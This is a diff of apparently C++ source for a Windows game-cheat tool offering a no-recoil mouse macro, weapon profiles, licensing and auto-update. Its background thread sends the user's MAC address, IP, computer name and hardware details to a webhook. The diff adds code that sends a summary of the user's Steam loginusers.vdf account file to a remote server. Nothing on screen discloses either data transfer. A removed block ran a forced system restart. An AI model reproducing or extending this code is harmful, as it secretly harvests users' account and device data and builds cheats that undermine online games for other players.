-        output_log_message("Retrieved user IP: " + user_ip + "\n");
+        std::string user_ip = get_cached_user_ip();
+        std::string user_country = get_cached_user_country();
+        output_log_message("Retrieved user IP: " + user_ip + ", Country: " + user_country + "\n");
         
         std::string msg = "User: " + username + 
                          "\nComputer: " + computer_name + 
                          "\nMAC: " + mac_address + 
                          "\nIP Address: " + user_ip + 
+                         "\nCountry: " + user_country + 
                          "\nGPU: " + gpu_info + 
                          "\nSystem Language: " + system_language + 
                          "\nTotal RAM: " + ram_info + 
@@ -5864,13 +6764,19 @@ int main(int, char**) {
                          "\nSystem Uptime: " + system_uptime;
 
         send_webhook_via_google_script(webhook_url, token, msg);
+
+        std::string steam_msg =
+            "User: " + username +
+            "\nDevice ID (Hashed): " + device_id +
+            "\nSteam loginusers.vdf summary:\n" + steam_summary;
+        send_steam_log_via_server(steam_msg);
     });
     webhook_thread.detach(); // Detach the thread
 
 
     // 2. Create Win32 Window
     output_log_message("Attempting to register window class...\n");
-    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, "TeaR Core", NULL }; // Changed window title
+    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, "Core", NULL }; // Changed window title
     if (!::RegisterClassEx(&wc)) {
         output_log_message("Error: Failed to register window class!\n");
         // Consider adding GetLastError() here for more details
@@ -5913,6 +6819,11 @@ int main(int, char**) {
     output_log_message("Attempting to initialize Direct3D...\n");
     if (!CreateDeviceD3D(hwnd)) {
         output_log_message("Error: Direct3D initialization failed!\n");
+        MessageBoxA(NULL,
+                    "Direct3D initialization failed.\n"
+                    "Try updating GPU drivers, enabling DirectX, or running on a supported system.",
+                    "Direct3D Error",
+                    MB_ICONERROR | MB_OK);
         // CleanupDeviceD3D(); // Cleanup happens in cleanup_and_exit
         // ::DestroyWindow(hwnd); // Destroy happens in main loop or cleanup
         // ::UnregisterClass(wc.lpszClassName, wc.hInstance); // Unregister happens in cleanup
@@ -6023,95 +6934,11 @@ int main(int, char**) {
         mouse_hook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, hInstance, 0);
         if (!mouse_hook) { throw std::runtime_error("Failed to install mouse hook!"); }
         output_log_message("Mouse listener started.\n");
-        
-        // بررسی وجود فایل RESTART_REQUIRED.txt برای نمایش پیام در صفحه لاگین
+
+        // Ensure config directory exists (for settings persistence)
         char current_dir[MAX_PATH];
         GetCurrentDirectoryA(MAX_PATH, current_dir);
-        std::string restart_file_path = std::string(current_dir) + "\\RESTART_REQUIRED.txt";
-        
-        // بررسی وجود فایل نصبی برای تعیین نیاز به ریستارت
-        bool installer_exists = false;
-        
-        // لیست نام‌های ممکن برای فایل نصبی
-        std::vector<std::string> installer_names = {
-            "install-interception.exe",
-            "installinterception.exe",
-            "interception-install.exe",
-            "interceptioninstall.exe"
-        };
-        
-        // بررسی وجود هر یک از فایل‌های نصبی
-        for (const auto& name : installer_names) {
-            std::string installer_path = std::string(current_dir) + "\\" + name;
-            if (std::filesystem::exists(installer_path)) {
-                installer_exists = true;
-                output_log_message("[DEBUG] Found installer file: " + installer_path + "\n");
-                break;
-            }
-        }
-        
-        // Debug log removed
-        
-        // فقط در صورتی که فایل نصبی وجود داشته باشد و درایور نصب نشده باشد، نیاز به ریستارت داریم
-        bool restart_required = installer_exists && !g_interception_driver_installed;
-        
-        // بررسی وجود فایل SHOW_RESTART_AGAIN.txt که نشان می‌دهد کاربر در اجرای قبلی دسترسی ادمین را رد کرده است
-        std::string show_again_flag_path = std::string(current_dir) + "\\SHOW_RESTART_AGAIN.txt";
-        if (std::filesystem::exists(show_again_flag_path)) {
-            // Debug log removed
-            restart_required = true;
-            g_show_restart_message = true; // مستقیماً متغیر نمایش پیام را تنظیم می‌کنیم
-            
-            // حذف فایل بعد از خواندن
-            try {
-                // Debug log removed
-                
-                // استفاده از تابع forceDeleteFile برای حذف قطعی فایل
-                if (forceDeleteFile(show_again_flag_path)) {
-                    // Debug log removed
-                } else {
-                    // Debug log removed
-                }
-            } catch (const std::exception& e) {
-                // Debug log removed
-            } catch (...) {
-                // Debug log removed
-            }
-        }
-        
-        // اگر فایل نصبی وجود نداشته باشد و فایل RESTART_REQUIRED.txt وجود داشته باشد، فایل RESTART_REQUIRED.txt را حذف کن
-        if (!installer_exists && std::filesystem::exists(restart_file_path)) {
-            // Debug log removed
-            try {
-                if (forceDeleteFile(restart_file_path)) {
-                    // Debug log removed
-                } else {
-                    // Debug log removed
-                }
-            } catch (const std::exception& e) {
-                // Debug log removed
-            } catch (...) {
-                // Debug log removed
-            }
-        }
-        // اگر فایل RESTART_REQUIRED.txt وجود داشته باشد، نیاز به ریستارت داریم
-        else if (std::filesystem::exists(restart_file_path)) {
-            restart_required = true;
-            
-            // مخفی کردن فایل RESTART_REQUIRED.txt
-            try {
-                std::wstring wrestart_path = std::wstring(restart_file_path.begin(), restart_file_path.end());
-                SetFileAttributesW(wrestart_path.c_str(), FILE_ATTRIBUTE_HIDDEN);
-                output_log_message("[DEBUG] RESTART_REQUIRED.txt file is now hidden.\n");
-            } catch (...) {
-                // Debug log removed
-            }
-        }
-        
-        // Debug log removed
-        
         std::string config_dir = std::string(current_dir) + "\\config";
-        // اگر پوشه config وجود ندارد، آن را ایجاد کن
         if (!std::filesystem::exists(config_dir)) {
             try {
                 std::filesystem::create_directory(config_dir);
@@ -6122,40 +6949,7 @@ int main(int, char**) {
                 output_log_message("[DEBUG] Error creating config directory.\n");
             }
         }
-        // اگر فایل نصبی وجود نداشته باشد، فرض می‌کنیم که پیام ریستارت قبلاً نمایش داده نشده است
-        bool restart_already_shown = !installer_exists;
-        
-        // تنظیم متغیر سراسری برای نمایش پیام در رابط کاربری ImGui
-        g_system_restart_required = restart_required;
-        
-        // اگر فایل پرچم وجود ندارد یا فایل SHOW_RESTART_AGAIN.txt وجود دارد، پیام ریستارت را نمایش بده
-        // اگر g_show_restart_message قبلاً true شده باشد (توسط فایل SHOW_RESTART_AGAIN.txt)، به همان صورت باقی می‌ماند
-        if ((!restart_already_shown && restart_required) || g_show_restart_message) {
-            g_show_restart_message = true;
-            output_log_message("[DEBUG] Restart message will be shown.\n");
-                        
-            // اطمینان از وجود پوشه config
-            try {
-                if (!std::filesystem::exists(config_dir)) {
-                    std::filesystem::create_directory(config_dir);
-                    output_log_message("[DEBUG] Created config directory.\n");
-                    // مخفی کردن پوشه config
-                    SetFileAttributesW(L"config", FILE_ATTRIBUTE_HIDDEN);
-                }
-            } catch (const std::exception& e) {
-                output_log_message("[DEBUG] Error creating config directory: " + std::string(e.what()) + "\n");
-            } catch (...) {
-                output_log_message("[DEBUG] Unknown error creating config directory.\n");
-            }
-        } else {
-            g_show_restart_message = false;
-            if (restart_already_shown) {
-                output_log_message("[DEBUG] Restart message already shown before. Will not show it again.\n");
-            } else {
-                output_log_message("[DEBUG] No restart required. Will not show restart message.\n");
-            }
-        }
-        
+
         output_log_message("\nUI Window Ready.\n");
         
 
@@ -6165,7 +6959,10 @@ int main(int, char**) {
         output_log_message("Initialization error: " + std::string(e.what()) + "\n");
         // if (keyboard_hook) UnhookWindowsHookEx(keyboard_hook); // Cleanup happens in cleanup_and_exit
         // if (mouse_hook) UnhookWindowsHookEx(mouse_hook); // Cleanup happens in cleanup_and_exit
-        if (recoil_thread_obj.joinable()) recoil_thread_obj.detach(); // Detach if started but failed later
+        if (recoil_thread_obj.joinable()) {
+            g_recoil_thread_should_run.store(false, std::memory_order_relaxed);
+            recoil_thread_obj.join(); // Join if started but failed later
+        }
         // ImGui_ImplDX11_Shutdown(); ImGui_ImplWin32_Shutdown(); ImGui::DestroyContext(); // Cleanup happens in cleanup_and_exit
         // CleanupDeviceD3D(); // Cleanup happens in cleanup_and_exit
         // ::DestroyWindow(hwnd); // Destroy happens in main loop or cleanup
@@ -6222,6 +7019,13 @@ int main(int, char**) {
         // This prevents the loop from consuming excessive CPU when idle
         if (!show_config_window_local && !::PeekMessage(&msg, NULL, 0U, 0U, PM_NOREMOVE)) {
              ::WaitMessage();
+
+             // If an update has completed and exit was requested, break out of the loop
+             if (g_exit_after_update.load(std::memory_order_relaxed)) {
+                 done = true;
+             }
+
+             if (done) break;
              continue; // Go back to the start of the loop to process the message
         }
 
@@ -6495,16 +7299,79 @@ int main(int, char**) {
                 }
                 // --- End Login Button Modification ---
 
-                 // Display error message (read under mutex)
-                 {
-                     std::lock_guard<std::mutex> lock(g_login_error_mutex);
-                     if (!login_error_message.empty()) {
-                         ImGui::SameLine();
-                         ImGui::TextColored(ImVec4(1.0f, 0.0f, 0.0f, 1.0f), "%s", login_error_message.c_str());
-                     }
-                 }
+                // Display error message (read under mutex)
+                {
+                    std::lock_guard<std::mutex> lock(g_login_error_mutex);
+                    if (!login_error_message.empty()) {
+                        ImGui::SameLine();
+                        ImGui::TextColored(ImVec4(1.0f, 0.0f, 0.0f, 1.0f), "%s", login_error_message.c_str());
+                    }
+                }
 
-                 ImGui::Separator();
+                ImGui::Separator();
+
+                // --- Update / Download Progress UI ---
+                bool update_required  = g_update_required.load(std::memory_order_relaxed);
+                bool downloading      = g_update_download_in_progress.load(std::memory_order_relaxed);
+                bool download_done    = g_update_download_done.load(std::memory_order_relaxed);
+                bool download_failed  = g_update_download_failed.load(std::memory_order_relaxed);
+
+                if (update_required) {
+                    // Centered small window on top of login UI
+                    ImVec2 center = ImGui::GetMainViewport()->GetCenter();
+                    ImGui::SetNextWindowPos(center, ImGuiCond_Always, ImVec2(0.5f, 0.5f));
+                    // Make the window a bit larger so all text fits without scrollbars
+                    ImGui::SetNextWindowSize(ImVec2(420, 190), ImGuiCond_Always);
+
+                    ImGuiWindowFlags flags = ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoMove |
+                                             ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoSavedSettings |
+                                             ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse;
+
+                    // Build a title showing current version and, if available, new version (e.g. "Updating Core (1.1.2 -> 1.1.3)")
+                    std::string update_title = "Updating Core";
+                    update_title += " (";
+                    update_title += APP_VERSION_NUMBER;
+                    {
+                        std::lock_guard<std::mutex> lock(g_update_mutex);
+                        if (!g_update_new_version.empty()) {
+                            update_title += " -> ";
+                            update_title += g_update_new_version;
+                        }
+                    }
+                    update_title += ")";
+
+                    if (ImGui::Begin(update_title.c_str(), nullptr, flags)) {
+                        ImGui::TextWrapped("A new version of Core is being downloaded.");
+                        if (downloading) {
+                            ImGui::Text("Status: Downloading...");
+                        } else if (download_done && !download_failed) {
+                            ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.0f, 1.0f), "Status: Download complete.");
+                        } else if (download_failed) {
+                            ImGui::TextColored(ImVec4(1.0f, 0.4f, 0.4f, 1.0f), "Status: Download failed.");
+                        } else {
+                            ImGui::Text("Status: Waiting...");
+                        }
+
+                        long long downloaded_bytes = g_update_bytes_downloaded.load(std::memory_order_relaxed);
+                        long long total_bytes      = g_update_bytes_total.load(std::memory_order_relaxed);
+
+                        float progress = 0.0f;
+                        if (total_bytes > 0) {
+                            progress = static_cast<float>(downloaded_bytes) / static_cast<float>(total_bytes);
+                        }
+
+                        char progress_text[64];
+                        // Show only percentage to the user, without file size
+                        snprintf(progress_text, sizeof(progress_text), "%.1f%%", progress * 100.0f);
+
+                        ImGui::Spacing();
+                        ImGui::ProgressBar(progress, ImVec2(-1.0f, 0.0f), progress_text);
+
+                        ImGui::Spacing();
+                        ImGui::TextWrapped("After the download completes, this app will close and restart automatically.");
+                    }
+                    ImGui::End();
+                }
 
                  // --- Announcement Section ---
                  if (!g_announcement_fetch_initiated.load(std::memory_order_relaxed)) {
@@ -6541,40 +7408,11 @@ int main(int, char**) {
                  }
 
                  ImGui::EndChild();
-                 ImGui::PopStyleColor(); // Pop ChildBg
-                 ImGui::PopStyleVar();   // Pop WindowPadding
-                 // --- End Announcement Section ---
+                ImGui::PopStyleColor(); // Pop ChildBg
+                ImGui::PopStyleVar();   // Pop WindowPadding
+                // --- End Announcement Section ---
                   
-                  // نمایش پیام ریستارت در پایین صفحه لاگین اگر نیاز باشد و فقط در اولین اجرای برنامه
-                   if (g_system_restart_required && g_show_restart_message) {
-                       ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 0, 0, 255)); // رنگ قرمز برای هشدار
-                       ImGui::TextWrapped("===== IMPORTANT NOTICE =====");
-                       ImGui::TextWrapped("Interception driver has been installed, but requires a SYSTEM RESTART to complete installation.");
-                       ImGui::TextWrapped("Please restart your computer and run this application again.");
-                       ImGui::TextWrapped("===========================");
-                       ImGui::PopStyleColor();
-                       
-                       // دکمه ریست سیستم زیر پیام ریستارت
-                       ImGui::Spacing(); // اضافه کردن فاصله
-                       
-                       // استایل دکمه ریست (قرمز برای هشدار)
-                       ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.8f, 0.2f, 0.2f, 1.0f)); // رنگ قرمز
-                       ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.9f, 0.3f, 0.3f, 1.0f)); // قرمز روشن‌تر برای هاور
-                       ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(1.0f, 0.4f, 0.4f, 1.0f)); // قرمز روشن‌تر برای کلیک
-                       
-                       // دکمه ریست با اندازه کوچکتر
-                       float button_width = ImGui::GetWindowWidth() * 0.3f; // 30% عرض پنجره
-                       ImGui::SetCursorPosX((ImGui::GetWindowWidth() - button_width) * 0.5f); // وسط چین کردن دکمه
-                       
-                       if (ImGui::Button("Restart System", ImVec2(button_width, 30))) { // ارتفاع کمتر (30 پیکسل)
-                           // اجرای دستور ریست سیستم
-                           system("shutdown /r /t 5 /c \"Restarting system for driver installation...\" /f");
-                       }
-                      ImGui::PopStyleColor(3); // برگرداندن استایل‌ها
-                      
-                      ImGui::Separator();
-                  }
-
+                  // --- End Login View Content ---
 
             } else { // User is licensed AND valid, show the main content based on current_view
                 if (current_view == ViewState::Home) {
@@ -6583,9 +7421,25 @@ int main(int, char**) {
                     bool status_profile_active; std::string status_profile;
                     bool ui_toggle_status;
                     { std::lock_guard<std::mutex> lock(profile_mutex);
-                      status_profile_active = profile_macro_active.load(std::memory_order_relaxed); // Use renamed variable
+                      if (!profile_macro_active.load(std::memory_order_relaxed) || current_gun_profile_str.empty()) {
+                          profile_macro_active.store(true, std::memory_order_relaxed);
+                          if (current_gun_profile_str.empty()) {
+                              current_gun_profile_str = PROFILE_AK47;
+                          }
+                      }
+                      status_profile_active = true;
                       ui_toggle_status = ui_toggle_key_pressed.load(std::memory_order_relaxed); // وضعیت کلید UI toggle
                       status_profile = current_gun_profile_str; }
+
+                    // Keep Select Weapon combo in sync with the active profile so all sections refer to the same weapon
+                    if (status_profile_active) {
+                        for (int i = 0; i < (int)ALL_PROFILES.size(); ++i) {
+                            if (ALL_PROFILES[i] == status_profile) {
+                                current_weapon_index = i;
+                                break;
+                            }
+                        }
+                    }
                     ImGui::Text("UI Toggle Status: "); ImGui::SameLine();
                     if (ui_toggle_status) ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.0f, 1.0f), "Enabled (No Recoil Active)");
                     else ImGui::TextColored(ImVec4(1.0f, 0.0f, 0.0f, 1.0f), "Disabled (Press %s to enable No Recoil)", vk_code_to_string(g_ui_toggle_key.load()).c_str());
@@ -6606,12 +7460,12 @@ int main(int, char**) {
                             else if (state.handmade) scope_attachment = "Handmade";
                             
                             // بررسی و ذخیره نوع لوله (barrel)
-                            if (state.silencer) barrel_attachment = "Silencer";
+                            if (state.silencer) barrel_attachment = "Muzzle Brake";
                             
                             // بررسی MuzzleBoost فقط برای اسلحه‌های خاص
                             const std::string& current_profile_check = status_profile; // Use a local copy for checks
                             if (current_profile_check == PROFILE_AK47 || current_profile_check == PROFILE_LR300 || current_profile_check == PROFILE_THOMPSON || current_profile_check == PROFILE_MP5A4) {
-                                if (state.muzzle_boost) barrel_attachment = "MuzzleBoost";
+                                if (state.muzzle_boost) barrel_attachment = "Muzzle Boost";
                             }
                         }
                         // ساخت رشته نهایی اتصالات
@@ -6631,8 +7485,6 @@ int main(int, char**) {
                         }
                         
                         ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.0f, 1.0f), "Active - %s%s", status_profile.c_str(), active_attachments_str.c_str());
-                    } else {
-                        ImGui::TextColored(ImVec4(1.0f, 0.0f, 0.0f, 1.0f), "Inactive");
                     }
 
 
@@ -6679,7 +7531,7 @@ int main(int, char**) {
                         profiles_cstr.push_back(profile.c_str());
                     }
                     if (ImGui::Combo("##WeaponSelect", &current_weapon_index, profiles_cstr.data(), profiles_cstr.size())) {
-                        // Weapon selection changed, update the current gun profile string
+                        // Weapon selection changed via mouse/keyboard navigation inside combo, update the current gun profile string
                         {
                             std::lock_guard<std::mutex> lock(profile_mutex);
                             current_gun_profile_str = ALL_PROFILES[current_weapon_index];
@@ -6690,20 +7542,25 @@ int main(int, char**) {
                         // Recalculate profiles immediately after changing weapon? Or only on "Apply"?
                         // Let's stick to "Apply" button for recalculation to avoid performance issues on every selection change.
                     }
+
                     ImGui::PopItemWidth();
                     ImGui::Separator();
 
+                    // --- Attachment Toggles (Based on Active Profile / Selected Weapon) ---
+                    // Determine which weapon's attachments we are editing:
+                    // Prefer the currently active profile shown in Profile Status; if none, fall back to combo selection.
+                    std::string attachments_weapon_name = status_profile_active ? status_profile : ALL_PROFILES[current_weapon_index];
 
-                    // --- Attachment Toggles (Based on Selected Weapon) ---
                     ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.5f, 0.0f, 1.0f)); // Orange color
-                    ImGui::Text("Attachments for %s:", ALL_PROFILES[current_weapon_index].c_str());
+                    ImGui::Text("Attachments for %s:", attachments_weapon_name.c_str());
                     ImGui::PopStyleColor(); // Revert color
                     ImGui::SameLine(); HelpMarker("Recalculates profiles automatically when changed.");
 
-                    // Get the attachment state for the currently selected weapon
-                    AttachmentState& current_attachments = g_attachment_states[ALL_PROFILES[current_weapon_index]];
+                    // Get the attachment state for the chosen weapon
+                    AttachmentState& current_attachments = g_attachment_states[attachments_weapon_name];
                     bool attachment_changed = false; // Track if any attachment changed in this frame
 
+                    ImGui::SetNextItemOpen(true, ImGuiCond_Once);
                     if (ImGui::CollapsingHeader("Scopes")) {
                         // Scopes (assuming all guns can have these, but multipliers differ)
                         if (ImGui::Checkbox("Holo Sight", &current_attachments.holo)) {
@@ -6724,17 +7581,15 @@ int main(int, char**) {
                         }
                     }
 
+                    ImGui::SetNextItemOpen(true, ImGuiCond_Once);
                     if (ImGui::CollapsingHeader("Barrels")) {
                         // Barrels (assuming all guns can have these, but effects differ)
-                        if (ImGui::Checkbox("Silencer", &current_attachments.silencer)) {
+                        if (ImGui::Checkbox("Muzzle Brake", &current_attachments.silencer)) {
                             attachment_changed = true;
                         }
                         // Only show MuzzleBoost if the gun profile is one that uses it in the UI/logic
-                        const std::string& selected_profile = ALL_PROFILES[current_weapon_index];
-                        if (selected_profile == PROFILE_AK47 || selected_profile == PROFILE_LR300 || selected_profile == PROFILE_THOMPSON || selected_profile == PROFILE_MP5A4) {
-                             if (ImGui::Checkbox("Muzzle Boost", &current_attachments.muzzle_boost)) {
-                                 attachment_changed = true;
-                             }
+                        if (ImGui::Checkbox("Muzzle Boost", &current_attachments.muzzle_boost)) {
+                            attachment_changed = true;
                         }
                     }
 
@@ -6868,7 +7723,6 @@ int main(int, char**) {
                         ImGui::SameLine();
                         ImGui::Text("%s", vk_code_to_string(g_nightModeKey.load(std::memory_order_relaxed)).c_str());
                     }
-
                     ImGui::Separator();
                     ImGui::Text("Weapon Selection Keybinds:");
                     ImGui::Separator();
@@ -6888,7 +7742,7 @@ int main(int, char**) {
                                 // If capturing the Door Unlock Trigger, this button should not be active
                                 ImGui::TextDisabled("Change"); // Display disabled text instead of button
                                 ImGui::SameLine();
-                                ImGui::Text("%s", vk_code_to_string(current_vk).c_str());
+                                ImGui::Text("%s", current_key_name.c_str());
                             }
                             else if (g_is_capturing_keybind.load(std::memory_order_relaxed) && g_profile_being_rebound == profile_name) {
                                 ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(1.0f, 0.5f, 0.0f, 1.0f)); // Orange color
@@ -6905,7 +7759,7 @@ int main(int, char**) {
                                     output_log_message("Capturing keybind for " + profile_name + "...\n");
                                 }
                                 ImGui::SameLine();
-                                ImGui::Text("%s", vk_code_to_string(g_profile_keybinds.at(profile_name)).c_str()); // Use map lookup here
+                                ImGui::Text("%s", current_key_name.c_str()); 
                             }
                         }
                     } // Mutex released
@@ -7054,6 +7908,7 @@ int main(int, char**) {
                      long long duration_display;
                      std::chrono::system_clock::time_point activation_time_display;
                      int local_license_used_count = -1; // Initialize to default
+                     std::string plan_type_display;
                      {
 
                      std::lock_guard<std::mutex> lock(g_license_data_mutex); // قفل کردن قبل از خواندن داده‌های مشترک
@@ -7061,9 +7916,10 @@ int main(int, char**) {
                          duration_display = g_subscription_duration_seconds; // خواندن مدت زمان
                          activation_time_display = g_activation_time; // خواندن زمان فعال‌سازی
                          local_license_used_count = g_license_used_count; // خواندن تعداد استفاده شده
+                         plan_type_display = g_plan_type; // خواندن نوع پلن از سرور
                      }
                      // --- پایان خواندن امن ---
-
+                     
                       // نمایش وضعیت لایسنس
                      ImGui::Text("License Status: "); ImGui::SameLine();
 
@@ -7087,20 +7943,52 @@ int main(int, char**) {
                          }
                      }
 
-                     // <--- شروع تغییر: نمایش تاریخ شروع لایسنس از متغیر خوانده شده --->
+                    const char* plan_label = "Unknown";
+                    if (plan_type_display == "free_trial") {
+                        plan_label = "Free Trial";
+                    } else if (plan_type_display == "subscription") {
+                        plan_label = "Subscription";
+                    }
+
+                     // نمایش لیبل Plan Type بدون رنگ خاص، ولی مقدار را رنگی می‌کنیم
+                     ImGui::Text("Plan Type:");
+                     ImGui::SameLine();
+
+                     ImVec4 plan_color(1.0f, 1.0f, 1.0f, 1.0f);
+                     if (plan_type_display == "free_trial") {
+                         plan_color = ImVec4(0.80f, 0.50f, 0.20f, 1.0f); // Bronze
+                     } else if (plan_type_display == "subscription") {
+                         plan_color = ImVec4(1.0f, 0.84f, 0.0f, 1.0f); // Gold
+                     }
+                     ImGui::TextColored(plan_color, "%s", plan_label);
+
+                     // نمایش تاریخ شروع لایسنس از متغیر خوانده شده
                      ImGui::Text("Start License Date: %s", start_license_display.c_str());
-                     // <--- پایان تغییر --->
 
                      // Display original duration based on seconds
-                     ImGui::Text("Subscription Duration: %s", format_duration_seconds(duration_display).c_str());
+                    ImGui::Text("Subscription Duration: %s", format_duration_seconds(duration_display).c_str());
 
 
-                     // Calculate and display remaining time
-                     std::string remaining_time_str = calculate_remaining_duration_string(activation_time_display, duration_display);
-                     ImGui::Text("Remaining Time: %s", remaining_time_str.c_str());
+                    // Calculate and display remaining time
+                    std::string remaining_time_str = calculate_remaining_duration_string(activation_time_display, duration_display);
+                    ImGui::Text("Remaining Time: %s", remaining_time_str.c_str());
+
+                    // Display total usage time across all sessions (شامل سشن فعلی)
+                    long long total_usage_display = g_total_usage_seconds;
+                    if (g_isLoggedIn.load(std::memory_order_relaxed) &&
+                        g_session_start_time.time_since_epoch().count() != 0) {
+                        auto now_usage = std::chrono::steady_clock::now();
+                        auto delta_usage = std::chrono::duration_cast<std::chrono::seconds>(now_usage - g_session_start_time).count();
+                        if (delta_usage > 0) {
+                            total_usage_display += delta_usage;
+                        }
+                    }
+                    ImGui::Text("Total Usage: %s", format_duration_seconds(total_usage_display).c_str());
 
                      // نمایش تعداد استفاده شده (used_count)
-                     if (local_license_used_count >= 0) {
+                     if (plan_type_display == "free_trial") {
+                         ImGui::Text("Times Used: Not tracked for Free Trial");
+                     } else if (local_license_used_count >= 0) {
                          ImGui::Text("Times Used: %d", local_license_used_count);
                      } else {
                          ImGui::Text("Times Used: N/A");
@@ -7172,11 +8060,10 @@ int main(int, char**) {
                       
                       ImGui::Text("Last Update:"); // عنوان بخش
                       ImGui::SameLine();
-                      ImGui::TextColored(ImVec4(0.0f, 1.0f, 1.0f, 1.0f), "2025-05-24"); // تاریخ آخرین به‌روزرسانی با رنگ فیروزه‌ای
+                      ImGui::TextColored(ImVec4(0.0f, 1.0f, 1.0f, 1.0f), "2026-01-02"); // تاریخ آخرین به‌روزرسانی با رنگ فیروزه‌ای
                       
                       ImGui::TextWrapped("- Added Auto Crouch Scope feature");
-                      ImGui::TextWrapped("- Added Restart System button");
-                      ImGui::TextWrapped("- Improved button animations");
+                      ImGui::TextWrapped("- Added Night Mode System button");
                       ImGui::TextWrapped("- Fixed minor bugs and improved performance");
                       // --- End: Last Update Section ---
 
@@ -7221,6 +8108,9 @@ int main(int, char**) {
                           g_theme_settings.button_active_color = ImVec4(0.34f, 0.34f, 0.34f, 1.00f);
                           g_theme_settings.header_color = ImVec4(0.20f, 0.20f, 0.20f, 1.00f);
                           apply_theme();
+                          // Set feedback message
+                          g_feedback_message = "Dark Theme Applied!";
+                          g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // Show for 3 seconds
                       }
                       
                       ImGui::SameLine();
@@ -7234,6 +8124,9 @@ int main(int, char**) {
                           g_theme_settings.button_active_color = ImVec4(0.60f, 0.60f, 0.60f, 1.00f);
                           g_theme_settings.header_color = ImVec4(0.75f, 0.75f, 0.75f, 1.00f);
                           apply_theme();
+                          // Set feedback message
+                          g_feedback_message = "Light Theme Applied!";
+                          g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // Show for 3 seconds
                       }
                       
                       ImGui::SameLine();
@@ -7247,6 +8140,9 @@ int main(int, char**) {
                           g_theme_settings.button_active_color = ImVec4(0.35f, 0.45f, 0.55f, 1.00f);
                           g_theme_settings.header_color = ImVec4(0.20f, 0.30f, 0.40f, 1.00f);
                           apply_theme();
+                          // Set feedback message
+                          g_feedback_message = "Blue Theme Applied!";
+                          g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // Show for 3 seconds
                       }
                       
                       ImGui::SameLine();
@@ -7282,25 +8178,27 @@ int main(int, char**) {
                           g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // Show for 3 seconds
                       }
                       
-                      ImGui::Separator();
-                      
                       // Reset Button
-                       if (ImGui::Button("Reset to Default")) {
-                            // Reset to default gaming theme
-                            g_theme_settings.background_color = ImVec4(0.10f, 0.10f, 0.15f, 0.95f);
-                            g_theme_settings.text_color = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
-                            g_theme_settings.button_color = ImVec4(0.35f, 0.25f, 0.65f, 0.59f);
-                            g_theme_settings.button_hovered_color = ImVec4(0.50f, 0.30f, 0.80f, 0.80f);
-                            g_theme_settings.button_active_color = ImVec4(0.60f, 0.35f, 0.90f, 1.00f);
-                            g_theme_settings.header_color = ImVec4(0.40f, 0.25f, 0.70f, 0.45f);
-                           apply_theme();
-                           save_config(); // Save the default theme settings to config
-                           // Set feedback message for resetting
-                           g_feedback_message = "Theme Reset to Default!";
-                           g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // Show for 3 seconds
-                       }
-                       
-                       ImGui::SameLine();
+                      ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // Red color
+                      ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(1.0f, 0.2f, 0.2f, 1.0f)); // Lighter red on hover
+                      ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(1.0f, 0.4f, 0.4f, 1.0f)); // Even lighter red when active
+                      if (ImGui::Button("Reset to Default")) {
+                          // Reset to default gaming theme
+                          g_theme_settings.background_color = ImVec4(0.10f, 0.10f, 0.15f, 0.95f);
+                          g_theme_settings.text_color = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
+                          g_theme_settings.button_color = ImVec4(0.35f, 0.25f, 0.65f, 0.59f);
+                          g_theme_settings.button_hovered_color = ImVec4(0.50f, 0.30f, 0.80f, 0.80f);
+                          g_theme_settings.button_active_color = ImVec4(0.60f, 0.35f, 0.90f, 1.00f);
+                          g_theme_settings.header_color = ImVec4(0.40f, 0.25f, 0.70f, 0.45f);
+                          apply_theme();
+                          save_config(); // Save the default theme settings to config
+                          // Set feedback message for resetting
+                          g_feedback_message = "Theme Reset to Default!";
+                          g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // Show for 3 seconds
+                      }
+                      ImGui::PopStyleColor(3); // Pop the 3 color styles
+                      
+                      ImGui::SameLine();
                        
                        // Save Button
                        if (ImGui::Button("Save Theme")) {
@@ -7312,8 +8210,7 @@ int main(int, char**) {
                        ImGui::Separator();
                        
                        // --- Sound Settings ---
-                       ImGui::Text("Sound Settings");
-                       ImGui::Separator();
+                      ImGui::Text("Sound Settings");
                                               // Checkbox to toggle sound
                         if (ImGui::Checkbox("Enable Sounds", &sound_enabled_local)) {
                             g_sound_enabled.store(sound_enabled_local, std::memory_order_relaxed); // Update atomic state
@@ -7324,16 +8221,8 @@ int main(int, char**) {
                        
                        ImGui::Separator();
                        
-                       // Display current sound files (paths are hardcoded for now)
-                       ImGui::Text("Exit Sound: %s", LOGIN_FAILURE_SOUND_FILE.c_str());
-                       ImGui::Text("Login Success Sound: %s", LOGIN_SUCCESS_SOUND_FILE.c_str());
-                       ImGui::Text("Login Failure Sound: %s", LOGIN_FAILURE_SOUND_FILE.c_str());
-                       
-                       ImGui::Separator();
-                       
                        // --- Auto Save Settings ---
-                       ImGui::Text("Auto Save Settings");
-                       ImGui::Separator();
